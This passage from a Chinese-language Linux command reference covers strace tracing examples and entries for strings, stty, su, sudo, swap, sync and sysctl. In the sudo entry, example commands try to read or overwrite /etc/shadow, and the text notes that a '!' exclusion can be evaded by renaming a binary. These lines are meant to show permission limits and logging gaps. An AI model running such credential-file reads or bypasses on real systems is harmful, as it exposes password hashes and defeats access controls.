MAP_PRIVATE|MAP_FIXED, 3, 0x132000) \u003d 0xb34000\nold_mmap(0xb37000, 9676, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) \u003d 0xb37000\nclose(3)                                \u003d 0\nset_thread_area({entry_number:-1 -\u003e 6, base_addr:0xbf5ee740, limit:1048575, seg_32bit:1, contents:0, read_exec_only:0, limit_in_pages:1, seg_not_present:0, useable:1}) \u003d 0\nmunmap(0xbf5ef000, 65900)               \u003d 0\nfstat64(0, {st_mode\u003dS_IFCHR|0620, st_rdev\u003dmakedev(136, 0), ...}) \u003d 0\nmmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) \u003d 0xbf5ff000\nread(0, 99\n\"99\\n\", 1024)                   \u003d 3\nfstat64(1, {st_mode\u003dS_IFCHR|0620, st_rdev\u003dmakedev(136, 0), ...}) \u003d 0\nmmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) \u003d 0xbf5fe000\nwrite(1, \"000000099\\n\", 10000000099\n)             \u003d 10\nmunmap(0xbf5fe000, 4096)                \u003d 0\nexit_group(0)                           \u003d ?\n```\n\n从trace结构可以看到，系统首先调用execve开始一个新的进行，接着进行些环境的初始化操作，最后停顿在”read(0,”上面，这也就是执行到了我们的scanf函数，等待我们输入数字呢，在输入完99之后，在调用write函数将格式化后的数值”000000099″输出到屏幕，最后调用exit_group退出进行，完成整个程序的执行过程。\n\n **跟踪信号传递** \n\n我们还是使用上面的那个test程序，来观察进程接收信号的情况。还是先`strace ./test`，等到等待输入的画面的时候不要输入任何东西，然后打开另外一个窗口，输入如下的命令\n\n```\nkillall test\n```\n\n这时候就能看到我们的程序推出了，最后的trace结果如下：\n\n```\noracle@orainst[orcl]:~\n$strace ./test\n\nexecve(\"./test\", [\"./test\"], [/* 41 vars */]) \u003d 0\nuname({sys\u003d\"Linux\", node\u003d\"orainst.desktop.mycompany.com\", ...}) \u003d 0\nbrk(0)                                  \u003d 0x9ae2000\nold_mmap(NULL, 65900, PROT_READ, MAP_PRIVATE, 3, 0) \u003d 0xbf5ef000\nclose(3)                                \u003d 0\nopen(\"/lib/tls/libc.so.6\", O_RDONLY)    \u003d 3\nread(3, \"\\177ELF\\1\\1\\1\\0\\0\\0\\0\\0\\0\\0\\0\\0\\3\\0\\3\\0\\1\\0\\0\\0\\200X\\1\"..., 512) \u003d 512\nfstat64(3, {st_mode\u003dS_IFREG|0755, st_size\u003d1571692, ...}) \u003d 0\nold_mmap(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) \u003d 0xbf5ee000\nold_mmap(NULL, 1275340, PROT_READ|PROT_EXEC, MAP_PRIVATE, 3, 0) \u003d 0x2e9000\nold_mmap(0x41b000, 12288, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED, 3, 0x132000) \u003d 0x41b000\nold_mmap(0x41e000, 9676, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) \u003d 0x41e000\nclose(3)                                \u003d 0\nset_thread_area({entry_number:-1 -\u003e 6, base_addr:0xbf5ee740, limit:1048575, seg_32bit:1, contents:0, read_exec_only:0, limit_in_pages:1, seg_not_present:0, useable:1}) \u003d 0\nmunmap(0xbf5ef000, 65900)               \u003d 0\nfstat64(0, {st_mode\u003dS_IFCHR|0620, st_rdev\u003dmakedev(136, 0), ...}) \u003d 0\nmmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) \u003d 0xbf5ff000\nread(0, 0xbf5ff000, 1024)               \u003d ? ERESTARTSYS (To be restarted)\n--- SIGTERM (Terminated) @ 0 (0) ---\n+++ killed by SIGTERM +++\n```\n\ntrace中很清楚的告诉你test进程”+++ killed by SIGTERM +++”。\n\n **系统调用统计** \n\nstrace不光能追踪系统调用，通过使用参数-c，它还能将进程所有的系统调用做一个统计分析给你，下面就来看看strace的统计，这次我们执行带-c参数的strace：\n\nstrace -c ./test\n\n最后能得到这样的trace结果：\n\n```\noracle@orainst[orcl]:~\n$strace -c ./test\n```\n\n```\nexecve(\"./test\", [\"./test\"], [/* 41 vars */]) \u003d 0\n% time     seconds  usecs/call     calls    errors syscall\n------ ----------- ----------- --------- --------- ----------------\n 45.90    0.000140           5        27        25 open\n 34.43    0.000105           4        24        21 stat64\n  7.54    0.000023           5         5           old_mmap\n  2.62    0.000008           8         1           munmap\n  1.97    0.000006           6         1           uname\n  1.97    0.000006           2         3           fstat64\n  1.64    0.000005           3         2         1 read\n  1.31    0.000004           2         2           close\n  0.98    0.000003           3         1           brk\n  0.98    0.000003           3         1           mmap2\n  0.66    0.000002           2         1           set_thread_area\n------ ----------- ----------- --------- --------- ----------------\n100.00    0.000305                    68        47 total\n\n```\n\n这里很清楚的告诉你调用了那些系统函数，调用次数多少，消耗了多少时间等等这些信息，这个对我们分析一个程序来说是非常有用的。\n\n### 常用参数说明  \n\n除了-c参数之外，strace还提供了其他有用的参数给我们，让我们能很方便的得到自己想要的信息，下面就对那些常用的参数一一做个介绍。\n\n **重定向输出** \n\n参数-o用在将strace的结果输出到文件中，如果不指定-o参数的话，默认的输出设备是STDERR，也就是说使用”-o filename”和” 2\u003efilename”的结果是一样的。\n\n```\n# 这两个命令都是将strace结果输出到文件test.txt中\nstrace -c -o test.txt ./test\nstrace -c ./test  2\u003etest.txt\n```\n\n **对系统调用进行计时** \n\nstrace可以使用参数-T将每个系统调用所花费的时间打印出来，每个调用的时间花销现在在调用行最右边的尖括号里面。\n\n```\noracle@orainst[orcl]:~\n$strace -T ./test\n\n// 这里只摘录部分结果\nread(0, 1\n\"1\\n\", 1024)                    \u003d 2 \u003c2.673455\u003e\nfstat64(1, {st_mode\u003dS_IFCHR|0620, st_rdev\u003dmakedev(136, 0), ...}) \u003d 0 \u003c0.000014\u003e\nmmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) \u003d 0xbf5fe000 \u003c0.000017\u003e\nwrite(1, \"000000001\\n\", 10000000001\n)             \u003d 10 \u003c0.000016\u003e\nmunmap(0xbf5fe000, 4096)                \u003d 0 \u003c0.000020\u003e\nexit_group(0)                           \u003d ?\n```\n\n **系统调用的时间** \n\n这是一个很有用的功能，strace会将每次系统调用的发生时间记录下来，只要使用-t/tt/ttt三个参数就可以看到效果了，具体的例子可以自己去尝试。\n\n\u003ctable\u003e\n\n\u003cthead\u003e\n\n\u003ctr\u003e\n\n\u003cth\u003e参数名\u003c/th\u003e\n\n\u003cth\u003e输出样式\u003c/th\u003e\n\n\u003cth\u003e说明\u003c/th\u003e\n\n\u003c/tr\u003e\n\n\u003c/thead\u003e\n\n\u003ctbody\u003e\n\n\u003ctr\u003e\n\n\u003ctd\u003e-t\u003c/td\u003e\n\n\u003ctd\u003e10:33:04 exit_group(0)\u003c/td\u003e\n\n\u003ctd\u003e输出结果精确到秒\u003c/td\u003e\n\n\u003c/tr\u003e\n\n\u003ctr\u003e\n\n\u003ctd\u003e-tt\u003c/td\u003e\n\n\u003ctd\u003e10:33:48.159682 exit_group(0)\u003c/td\u003e\n\n\u003ctd\u003e输出结果精确到微妙\u003c/td\u003e\n\n\u003c/tr\u003e\n\n\u003ctr\u003e\n\n\u003ctd\u003e-ttt\u003c/td\u003e\n\n\u003ctd\u003e1262169244.788478 exit_group(0)\u003c/td\u003e\n\n\u003ctd\u003e精确到微妙，而且时间表示为unix时间戳\u003c/td\u003e\n\n\u003c/tr\u003e\n\n\u003c/tbody\u003e\n\n\u003c/table\u003e\n\n **截断输出** \n\n-s参数用于指定trace结果的每一行输出的字符串的长度，下面看看test程序中-s参数对结果有什么影响，现指定-s为20，然后在read的是是很我们输入一个超过20个字符的数字串\n\n```\nstrace -s 20 ./test\n\nread(0, 2222222222222222222222222      // 我们输入的2一共有25个\n\"22222222222222222222\"..., 1024) \u003d 26  // 而我们看到的结果中2只有20个\n```\n\n **trace一个现有的进程** \n\nstrace不光能自己初始化一个进程进行trace，还能追踪现有的进程，参数-p就是取这个作用的，用法也很简单，具体如下。\n\n```\nstrace -p pid\n```\n\n### 综合例子  \n\n说了那么多的功能和参数，现在我们来一个实用点的，就是研究下Oracle的lgwr进程，看看这个进程是不是像文档所说的那样没3s钟写一次log文件，考虑到lgwr写日志的触发条件比较多，我们需要找一个空闲的Oracle实例做这个实验。\n\n我们先要得到lgwr进程的pid，运行下面的命令\n\n```\nps -ef|grep lgwr\n\noracle    5912     1  0 Nov12 ?        00:14:56 ora_lgwr_orcl\n```\n\n得到lgwr的pid是5912，现在启动strace，然后将trace的几个输出到lgwr.txt文件中，执行下面的命令\n\n```\nstrace -tt -s 10 -o lgwr.txt -p 5912\n```\n\n过一会之后停止strace，然后查看结果。由于输出的结果比较多，为了方便我们只看Oracle写入log文件时用的pwrite函数的调用\n\n```\ngrep pwrite\\(20 lgwr.txt\n```\n\n等等，为什么grep的时候用的是”pwrite(2″呢？，因为我知道我这个机器打开的当前的log文件的句柄编号都是2开始的。具体查找方法是先使用下面的语句找出当前活动的日志文件都有哪些：\n\n```\nselect member, v$log.status from v$log, v$logfile\nwhere v$log.group#\u003dv$logfile.group#;\n```\n\n得到\n\n```\nMEMBER                                             STATUS\n-------------------------------------------------- ----------------\n/db/databases/orcl/redo-01-a/redo-t01-g03-m1.log    INACTIVE\n/db/databases/orcl/redo-03-a/redo-t01-g03-m2.log    INACTIVE\n/db/databases/orcl/redo-02-a/redo-t01-g02-m1.log    CURRENT\n/db/databases/orcl/redo-04-a/redo-t01-g02-m2.log    CURRENT\n/db/databases/orcl/redo-01-a/redo-t01-g01-m1.log    INACTIVE\n/db/databases/orcl/redo-03-a/redo-t01-g01-m2.log    INACTIVE\n/db/databases/orcl/redo-02-a/redo-t01-g04-m1.log    INACTIVE\n/db/databases/orcl/redo-04-a/redo-t01-g04-m2.log    INACTIVE\n```\n\n然后到/proc中去找打开文件的句柄：\n\n```\nll /proc/.5912/fd/\n```\n\n得到\n\n```\nlrwx------    1 oracle   dba            64 Dec 30 10:55 18 -\u003e /db/databases/orcl/redo-01-a/redo-t01-g01-m1.log\nlrwx------    1 oracle   dba            64 Dec 30 10:55 19 -\u003e /db/databases/orcl/redo-03-a/redo-t01-g01-m2.log\nlrwx------    1 oracle   dba            64 Dec 30 10:55 20 -\u003e /db/databases/orcl/redo-02-a/redo-t01-g02-m1.log\nlrwx------    1 oracle   dba            64 Dec 30 10:55 21 -\u003e /db/databases/orcl/redo-04-a/redo-t01-g02-m2.log\nlrwx------    1 oracle   dba            64 Dec 30 10:55 22 -\u003e /db/databases/orcl/redo-01-a/redo-t01-g03-m1.log\nlrwx------    1 oracle   dba            64 Dec 30 10:55 23 -\u003e /db/databases/orcl/redo-03-a/redo-t01-g03-m2.log\nlrwx------    1 oracle   dba            64 Dec 30 10:55 24 -\u003e /db/databases/orcl/redo-02-a/redo-t01-g04-m1.log\nlrwx------    1 oracle   dba            64 Dec 30 10:55 25 -\u003e /db/databases/orcl/redo-04-a/redo-t01-g04-m2.log\n```\n\n现在能看到我机器当前日志文件的句柄分别是20和21。\n\n现在我们得到如下结果\n\n```\n11:13:55.603245 pwrite(20, \"\\1\\\"\\0\\0J!\"..., 1536, 4363264) \u003d 1536\n11:13:55.603569 pwrite(21, \"\\1\\\"\\0\\0J!\"..., 1536, 4363264) \u003d 1536\n11:13:55.606888 pwrite(20, \"\\1\\\"\\0\\0M!\"..., 1536, 4364800) \u003d 1536\n11:13:55.607172 pwrite(21, \"\\1\\\"\\0\\0M!\"..., 1536, 4364800) \u003d 1536\n11:13:55.607934 pwrite(20, \"\\1\\\"\\0\\0P!\"..., 1536, 4366336) \u003d 1536\n11:13:55.608199 pwrite(21, \"\\1\\\"\\0\\0P!\"..., 1536, 4366336) \u003d 1536\n11:13:55.610260 pwrite(20, \"\\1\\\"\\0\\0S!\"..., 1536, 4367872) \u003d 1536\n11:13:55.610530 pwrite(21, \"\\1\\\"\\0\\0S!\"..., 1536, 4367872) \u003d 1536\n11:14:00.602446 pwrite(20, \"\\1\\\"\\0\\0V!\"..., 1536, 4369408) \u003d 1536\n11:14:00.602750 pwrite(21, \"\\1\\\"\\0\\0V!\"..., 1536, 4369408) \u003d 1536\n11:14:00.606386 pwrite(20, \"\\1\\\"\\0\\0Y!\"..., 1536, 4370944) \u003d 1536\n11:14:00.606676 pwrite(21, \"\\1\\\"\\0\\0Y!\"..., 1536, 4370944) \u003d 1536\n11:14:00.607900 pwrite(20, \"\\1\\\"\\0\\0\\\\\"..., 1024, 4372480) \u003d 1024\n11:14:00.608161 pwrite(21, \"\\1\\\"\\0\\0\\\\\"..., 1024, 4372480) \u003d 1024\n11:14:00.608816 pwrite(20, \"\\1\\\"\\0\\0^!\"..., 1024, 4373504) \u003d 1024\n11:14:00.609071 pwrite(21, \"\\1\\\"\\0\\0^!\"..., 1024, 4373504) \u003d 1024\n11:14:00.611142 pwrite(20, \"\\1\\\"\\0\\0`!\"..., 1536, 4374528) \u003d 1536\n11:14:00.611454 pwrite(21, \"\\1\\\"\\0\\0`!\"..., 1536, 4374528) \u003d 1536\n11:14:05.602804 pwrite(20, \"\\1\\\"\\0\\0c!\"..., 1024, 4376064) \u003d 1024\n11:14:05.603119 pwrite(21, \"\\1\\\"\\0\\0c!\"..., 1024, 4376064) \u003d 1024\n11:14:05.607731 pwrite(20, \"\\1\\\"\\0\\0e!\"..., 1024, 4377088) \u003d 1024\n11:14:05.608020 pwrite(21, \"\\1\\\"\\0\\0e!\"..., 1024, 4377088) \u003d 1024\n11:14:05.608690 pwrite(20, \"\\1\\\"\\0\\0g!\"..., 1024, 4378112) \u003d 1024\n11:14:05.608962 pwrite(21, \"\\1\\\"\\0\\0g!\"..., 1024, 4378112) \u003d 1024\n11:14:05.611022 pwrite(20, \"\\1\\\"\\0\\0i!\"..., 1536, 4379136) \u003d 1536\n11:14:05.611283 pwrite(21, \"\\1\\\"\\0\\0i!\"..., 1536, 4379136) \u003d 1536\n```\n\n\n"},{"name":"strings","categoryId":0,"data":"strings\n\u003d\u003d\u003d\n\n在对象文件或二进制文件中查找可打印的字符串\n\n## 补充说明\n\n**strings命令** 在对象文件或二进制文件中查找可打印的字符串。字符串是4个或更多可打印字符的任意序列，以换行符或空字符结束。 strings命令对识别随机对象文件很有用。\n\n### 语法  \n\n```\nstrings [ -a ] [ - ] [ -o ] [ -t Format ] [ -n Number ] [ -Number ]  [file ... ]\n```\n\n### 选项  \n\n```\n-a --all：扫描整个文件而不是只扫描目标文件初始化和装载段\n-f –print-file-name：在显示字符串前先显示文件名\n-n –bytes\u003d[number]：找到并且输出所有NUL终止符序列\n- ：设置显示的最少的字符数，默认是4个字符\n-t --radix\u003d{o,d,x} ：输出字符的位置，基于八进制，十进制或者十六进制\n-o ：类似--radix\u003do\n-T --target\u003d ：指定二进制文件格式\n-e --encoding\u003d{s,S,b,l,B,L} ：选择字符大小和排列顺序:s \u003d 7-bit, S \u003d 8-bit, {b,l} \u003d 16-bit, {B,L} \u003d 32-bit\n@ ：读取中选项\n```\n\n### 实例  \n\n列出ls中所有的ASCII文本：\n\n```\nstrings /bin/ls\n```\n\n列出ls中所有的ASCII文本：\n\n```\ncat /bin/ls strings\n```\n\n查找ls中包含libc的字符串，不区分大小写：\n\n```\nstrings /bin/ls | grep -i libc\n```\n\n\n"},{"name":"stty","categoryId":0,"data":"stty\n\u003d\u003d\u003d\n\n修改终端命令行的相关设置\n\n## 补充说明\n\n**stty命令** 修改终端命令行的相关设置。\n\n### 语法  \n\n```\nstty(选项)(参数)\n```\n\n### 选项  \n\n```\n-a：以容易阅读的方式打印当前的所有配置；\n-g：以stty可读方式打印当前的所有配置。\n```\n\n### 参数  \n\n终端设置：指定终端命令行的设置选项。\n\n### 实例  \n\n **在命令行下，禁止输出大写的方法：** \n\n```\nstty iuclc     #开启\nstty -iuclc    #恢复\n```\n\n **在命令行下禁止输出小写：** \n\n```\nstty olcuc    #开启\nstty -olcuc   #恢复\n```\n\n **打印出终端的行数和列数：** \n\n```\nstty size\n```\n\n **改变Ctrl+D的方法:** \n\n```\nstty eof \"string\"\n```\n\n系统默认是Ctrl+D来表示文件的结束，而通过这种方法，可以改变！\n\n **屏蔽显示：** \n\n```\nstty -echo   #禁止回显\nstty echo    #打开回显\n```\n\n测试方法:\n\n```\nstty -echo;read;stty echo;read\n```\n\n **忽略回车符：** \n\n```\nstty igncr     #开启\nstty -igncr    #恢复\n```\n\n **定时输入：** \n\n```\ntimeout_read()\n{\n    timeout\u003d$1\n    old_stty_settings\u003d`stty -g`　　#save current settings\n    stty -icanon min 0 time 100　　#set 10seconds,not 100seconds\n    eval read varname　　          #\u003dread $varname\n    stty \"$old_stty_settings\"　　  #recover settings\n}\n```\n\n更简单的方法就是利用read命令的`-t`选项：\n\n```\nread -t 10 varname\n```\n\n\n"},{"name":"su","categoryId":2,"data":"su\n\u003d\u003d\u003d\n\n用于切换当前用户身份到其他用户身份\n\n## 补充说明\n\n**su命令** 用于切换当前用户身份到其他用户身份，变更时须输入所要变更的用户帐号与密码。\n\n### 语法  \n\n```\nsu(选项)(参数)\n```\n\n### 选项  \n\n```\n-c\u003c指令\u003e或--command\u003d\u003c指令\u003e：执行完指定的指令后，即恢复原来的身份；\n-f或——fast：适用于csh与tsch，使shell不用去读取启动文件；\n-l或——login：改变身份时，也同时变更工作目录，以及HOME,SHELL,USER,logname。此外，也会变更PATH变量；\n-m,-p或--preserve-environment：变更身份时，不要变更环境变量；\n-s\u003cshell\u003e或--shell\u003d\u003cshell\u003e：指定要执行的shell；\n--help：显示帮助；\n--version；显示版本信息。\n```\n\n### 参数  \n\n用户：指定要切换身份的目标用户。\n\n### 实例  \n\n变更帐号为root并在执行ls指令后退出变回原使用者：\n\n```\nsu -c ls root\n```\n\n变更帐号为root并传入`-f`选项给新执行的shell：\n\n```\nsu root -f\n```\n\n变更帐号为test并改变工作目录至test的家目录：\n\n```\nsu -test\n```\n\n\n"},{"name":"sudo","categoryId":2,"data":"sudo\n\u003d\u003d\u003d\n\n以其他身份来执行命令\n\n## 补充说明\n\n**sudo命令** 用来以其他身份来执行命令，预设的身份为root。在`/etc/sudoers`中设置了可执行sudo指令的用户。若其未经授权的用户企图使用sudo，则会发出警告的邮件给管理员。用户使用sudo时，必须先输入密码，之后有5分钟的有效期限，超过期限则必须重新输入密码。\n\n### 语法  \n\n```\nsudo(选项)(参数)\n```\n\n### 选项  \n\n```\n-b：在后台执行指令；\n-h：显示帮助；\n-H：将HOME环境变量设为新身份的HOME环境变量；\n-k：结束密码的有效期限，也就是下次再执行sudo时便需要输入密码；。\n-l：列出目前用户可执行与无法执行的指令；\n-p：改变询问密码的提示符号；\n-s\u003cshell\u003e：执行指定的shell；\n-u\u003c用户\u003e：以指定的用户作为新的身份。若不加上此参数，则预设以root作为新的身份；\n-v：延长密码有效期限5分钟；\n-V ：显示版本信息。\n```\n\n### 参数  \n\n指令：需要运行的指令和对应的参数。\n\n### 实例  \n\n配置sudo必须通过编辑`/etc/sudoers`文件，而且只有超级用户才可以修改它，还必须使用visudo编辑。之所以使用visudo有两个原因，一是它能够防止两个用户同时修改它；二是它也能进行有限的语法检查。所以，即使只有你一个超级用户，你也最好用visudo来检查一下语法。\n\nvisudo默认的是在vi里打开配置文件，用vi来修改文件。我们可以在编译时修改这个默认项。visudo不会擅自保存带有语法错误的配置文件，它会提示你出现的问题，并询问该如何处理，就像：\n\n```\n\u003e\u003e\u003e sudoers file: syntax error, line 22 \u003c\u003c\n```\n\n此时我们有三种选择：键入“e”是重新编辑，键入“x”是不保存退出，键入“Q”是退出并保存。如果真选择Q，那么sudo将不会再运行，直到错误被纠正。\n\n现在，我们一起来看一下神秘的配置文件，学一下如何编写它。让我们从一个简单的例子开始：让用户Foobar可以通过sudo执行所有root可执行的命令。以root身份用visudo打开配置文件，可以看到类似下面几行：\n\n```\n# Runas alias specification\n# User privilege specificationroot    ALL\u003d(ALL)ALL\n```\n\n我们一看就明白个差不多了，root有所有权限，只要仿照现有root的例子就行，我们在下面加一行（最好用tab作为空白）：\n\n```\nfoobar ALL\u003d(ALL)    ALL\n```\n\n保存退出后，切换到foobar用户，我们用它的身份执行命令：\n\n```\n[foobar@localhost ~]$ ls /root\nls: /root: 权限不够\n\n[foobar@localhost ~]$ sudo ls /root\nPassWord:\nanaconda-ks.cfg Desktop install.log install.log.syslog\n```\n\n好了，我们限制一下foobar的权利，不让他为所欲为。比如我们只想让他像root那样使用ls和ifconfig，把那一行改为：\n\n```\nfoobar localhost\u003d    /sbin/ifconfig,   /bin/ls\n```\n\n再来执行命令：\n\n```\n[foobar@localhost ~]$ sudo head -5 /etc/shadow\nPassword:\nSorry, user foobar is not allowed to execute \u0027/usr/bin/head -5 /etc/shadow\u0027 as root on localhost.localdomain.\n\n[foobar@localhost ~]$ sudo /sbin/ifconfigeth0      Linkencap:Ethernet HWaddr 00:14:85:EC:E9:9B...\n```\n\n现在让我们来看一下那三个ALL到底是什么意思。第一个ALL是指网络中的主机，我们后面把它改成了主机名，它指明foobar可以在此主机上执行后面的命令。第二个括号里的ALL是指目标用户，也就是以谁的身份去执行命令。最后一个ALL当然就是指命令名了。例如，我们想让foobar用户在linux主机上以jimmy或rene的身份执行kill命令，这样编写配置文件：\n\n```\nfoobar    linux\u003d(jimmy,rene)    /bin/kill\n```\n\n但这还有个问题，foobar到底以jimmy还是rene的身份执行？这时我们应该想到了`sudo -u`了，它正是用在这种时候。 foobar可以使用`sudo -u jimmy kill PID`或者`sudo -u rene kill PID`，但这样挺麻烦，其实我们可以不必每次加`-u`，把rene或jimmy设为默认的目标用户即可。再在上面加一行：\n\n```\nDefaults:foobar    runas_default\u003drene\n```\n\nDefaults后面如果有冒号，是对后面用户的默认，如果没有，则是对所有用户的默认。就像配置文件中自带的一行：\n\n```\nDefaults    env_reset\n```\n\n另一个问题是，很多时候，我们本来就登录了，每次使用sudo还要输入密码就显得烦琐了。我们可不可以不再输入密码呢？当然可以，我们这样修改配置文件：\n\n```\nfoobar localhost\u003dNOPASSWD:     /bin/cat, /bin/ls\n```\n\n再来sudo一下：\n\n```\n[foobar@localhost ~]$ sudo ls /rootanaconda-ks.cfg Desktop install.log\ninstall.log.syslog\n```\n\n当然，你也可以说“某些命令用户foobar不可以运行”，通过使用!操作符，但这不是一个好主意。因为，用!操作符来从ALL中“剔出”一些命令一般是没什么效果的，一个用户完全可以把那个命令拷贝到别的地方，换一个名字后再来运行。\n\n **日志与安全** \n\nsudo为安全考虑得很周到，不仅可以记录日志，还能在有必要时向系统管理员报告。但是，sudo的日志功能不是自动的，必须由管理员开启。这样来做：\n\n```\ntouch /var/log/sudo\nvi /etc/syslog.conf\n```\n\n在syslog.conf最后面加一行（必须用tab分割开）并保存：\n\n```\nlocal2.debug                    /var/log/sudo\n```\n\n重启日志守候进程，\n\n```\nps aux grep syslogd\n```\n\n把得到的syslogd进程的PID（输出的第二列是PID）填入下面：\n\n```\nkill –HUP PID\n```\n\n这样，sudo就可以写日志了：\n\n```\n[foobar@localhost ~]$ sudo ls /rootanaconda-ks.cfg\nDesktop install.log\ninstall.log.syslog\n$cat /var/log/sudoJul 28 22:52:54 localhost sudo:   foobar :\nTTY\u003dpts/1 ; pwd\u003d/home/foobar ; USER\u003droot ; command\u003d/bin/ls /root\n```\n\n不过，有一个小小的“缺陷”，sudo记录日志并不是很忠实：\n\n```\n[foobar@localhost ~]$ sudo cat /etc/shadow \u003e /dev/null\ncat /var/log/sudo...Jul 28 23:10:24 localhost sudo:   foobar : TTY\u003dpts/1 ;\nPWD\u003d/home/foobar ; USER\u003droot ; COMMAND\u003d/bin/cat /etc/shadow\n```\n\n重定向没有被记录在案！为什么？因为在命令运行之前，shell把重定向的工作做完了，sudo根本就没看到重定向。这也有个好处，下面的手段不会得逞：\n\n```\n[foobar@localhost ~]$ sudo ls /root \u003e /etc/shadowbash: /etc/shadow: 权限不够\n```\n\nsudo 有自己的方式来保护安全。以root的身份执行`sudo-V`，查看一下sudo的设置。因为考虑到安全问题，一部分环境变量并没有传递给sudo后面的命令，或者被检查后再传递的，比如：PATH，HOME，SHELL等。当然，你也可以通过sudoers来配置这些环境变量。\n\n\n"},{"name":"sum","categoryId":0,"data":"sum\n\u003d\u003d\u003d\n\n计算文件的校验码和显示块数\n\n## 补充说明\n\n**sum命令** 用于计算并显示指定文件的校验和与文件所占用的磁盘块数。\n\n### 语法  \n\n```\nsum(选项)(参数)\n```\n\n### 选项  \n\n```\n-r：使用BSD的校验和算法，块大小为1k；\n-s：使用system V的校验和算法，块大小为512字节。\n```\n\n### 参数  \n\n文件列表：需要计算和与磁盘块数的文件列表。\n\n### 实例  \n\n计算文件校验码：\n\n```\n[root@localhost ~]# sum insert.sql\n00827    12\n```\n\n\n"},{"name":"swapoff","categoryId":3,"data":"swapoff\n\u003d\u003d\u003d\n\n关闭指定的交换空间\n\n## 补充说明\n\n**swapoff命令** 用于关闭指定的交换空间（包括交换文件和交换分区）。swapoff实际上为swapon的符号连接，可用来关闭系统的交换区。\n\n### 语法  \n\n```\nswapoff(选项)(参数)\n```\n\n### 选项  \n\n```\n-a：关闭配置文件“/etc/fstab”中所有的交换空间。\n```\n\n### 参数  \n\n交换空间：指定需要激活的交换空间，可以是交换文件和交换分区，如果是交换分区则指定交换分区对应的设备文件。\n\n### 实例  \n\n关闭交换分区\n\n```\nswapoff /dev/sda2\n```\n\n\n"},{"name":"swapon","categoryId":3,"data":"swapon\n\u003d\u003d\u003d\n\n激活Linux系统中交换空间\n\n## 补充说明\n\n**swapon命令** 用于激活Linux系统中交换空间，Linux系统的内存管理必须使用交换区来建立虚拟内存。\n\n### 语法  \n\n```\nswapon(选项)(参数)\n```\n\n### 选项  \n\n```\n-a：将/etc/fstab文件中所有设置为swap的设备，启动为交换区；\n-h：显示帮助；\n-p\u003c优先顺序\u003e：指定交换区的优先顺序；\n-s：显示交换区的使用状况；\n-V：显示版本信息。\n```\n\n### 参数  \n\n交换空间：指定需要激活的交换空间，可以是交换文件和交换分区，如果是交换分区则指定交换分区对应的设备文件。\n\n### 实例  \n\n```\nmkswap -c /dev/hdb4 （-c是检查有无坏块）\nswapon -v /dev/hdb4\nswapon -s\nFilename                                type            Size    Used    Priority\n/dev/hda5                               partition       506008 96      -1\n/dev/hdb4                               partition       489972 0       -2\n```\n\n\n"},{"name":"sync","categoryId":3,"data":"sync\n\u003d\u003d\u003d\n\n用于强制被改变的内容立刻写入磁盘\n\n## 补充说明\n\n**sync命令** 用于强制被改变的内容立刻写入磁盘，更新超块信息。\n\n在Linux/Unix系统中，在文件或数据处理过程中一般先放到内存缓冲区中，等到适当的时候再写入磁盘，以提高系统的运行效率。sync命令则可用来强制将内存缓冲区中的数据立即写入磁盘中。用户通常不需执行sync命令，系统会自动执行update或bdflush操作，将缓冲区的数据写 入磁盘。只有在update或bdflush无法执行或用户需要非正常关机时，才需手动执行sync命令。\n\n### 语法  \n\n```\nsync(选项)\n```\n\n### 选项  \n\n```\n--help：显示帮助；\n --version：显示版本信息。\n```\n\n### buffer与cache  \n\n*   buffer：为了解决写磁盘的效率\n*   cache：为了解决读磁盘的效率\n\nlinux系统为了提高读写磁盘的效率，会先将数据放在一块buffer中。在写磁盘时并不是立即将数据写到磁盘中，而是先写入这块buffer中了。此时如果重启系统，就可能造成数据丢失。\n\nsync命令用来flush文件系统buffer，这样数据才会真正的写到磁盘中，并且buffer才能够释放出来，flush就是用来清空buffer。sync命令会强制将数据写入磁盘中，并释放该数据对应的buffer，所以常常会在写磁盘后输入sync命令来将数据真正的写入磁盘。\n\n如果不去手动的输入sync命令来真正的去写磁盘，linux系统也会周期性的去sync数据。\n\n\n"},{"name":"sysctl","categoryId":0,"data":"sysctl\n\u003d\u003d\u003d\n\n时动态地修改内核的运行参数\n\n## 补充说明\n\n**sysctl命令** 被用于在内核运行时动态地修改内核的运行参数，可用的内核参数在目录`/proc/sys`中。它包含一些TCP/ip堆栈和虚拟内存系统的高级选项， 这可以让有经验的管理员提高引人注目的系统性能。用sysctl可以读取设置超过五百个系统变量。\n\n### 语法  \n\n```\nsysctl(选项)(参数)\n```\n\n### 选项  \n\n```\n-n：打印值时不打印关键字；\n-e：忽略未知关键字错误；\n-N：仅打印名称；\n-w：当改变sysctl设置时使用此项；\n-p：从配置文件“/etc/sysctl.conf”加载内核参数设置；\n-a：打印当前所有可用的内核参数变量和值；\n-A：以表格方式打印当前所有可用的内核参数变量和值。\n```\n\n### 参数  \n\n变量\u003d值：设置内核参数对应的变量值。\n\n### 实例  \n\n查看所有可读变量：\n\nsysctl -a\n\n读一个指定的变量，例如`kern.maxproc`：\n\nsysctl kern.maxproc kern.maxproc: 1044\n\n要设置一个指定的变量，直接用`variable\u003dvalue`这样的语法：\n\n```\nsysctl kern.maxfiles\u003d5000\nkern.maxfiles: 2088 -\u003e 5000\n```\n\n您可以使用sysctl修改系统变量，也可以通过编辑sysctl.conf文件来修改系统变量。sysctl.conf看起来很像rc.conf。它用`variable\u003dvalue`的形式来设定值。指定的值在系统进入多用户模式之后被设定。并不是所有的变量都可以在这个模式下设定。\n\nsysctl变量的设置通常是字符串、数字或者布尔型。（布尔型用 1 来表示\u0027yes\u0027，用 0 来表示\u0027no\u0027）。\n\n```\nsysctl -w kernel.sysrq\u003d0\nsysctl -w kernel.core_uses_pid\u003d1\nsysctl -w net.ipv4.conf.default.accept_redirects\u003d0\nsysctl -w net.ipv4.conf.default.accept_source_route\u003d0\nsysctl -w 